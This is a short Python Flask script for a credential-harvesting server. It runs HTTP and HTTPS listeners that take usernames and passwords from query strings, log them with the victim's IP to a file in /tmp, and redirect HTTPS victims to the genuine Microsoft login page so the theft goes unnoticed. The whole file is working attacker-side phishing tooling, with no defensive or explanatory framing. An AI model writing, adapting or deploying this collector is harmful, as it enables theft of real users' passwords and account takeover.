from flask import Flask, request, redirect
from threading import Thread

http_app = Flask('http')
https_app = Flask('https')

def log_credentials(source, ip, user, passwd):
    with open(f"/tmp/responder_creds.txt", "a") as f:
        f.write(f"[{source.upper()}] IP: {ip}, Username: {user}, Password: {passwd}\n")

@http_app.route('/log', methods=['GET'])
def log_http():
    user = request.args.get('u')
    passwd = request.args.get('p')
    log_credentials("http", request.remote_addr, user, passwd)
    return '', 204

@https_app.route('/log', methods=['GET'])
def log_https():
    user = request.args.get('u')
    passwd = request.args.get('p')
    log_credentials("https", request.remote_addr, user, passwd)
    return redirect("https://login.microsoftonline.com")

def run_http():
    http_app.run(host='0.0.0.0', port=9998)

def run_https():
    https_app.run(host='0.0.0.0', port=9999, ssl_context=('cert.pem', 'key.pem'))

if __name__ == '__main__':
    Thread(target=run_http).start()
    Thread(target=run_https).start()
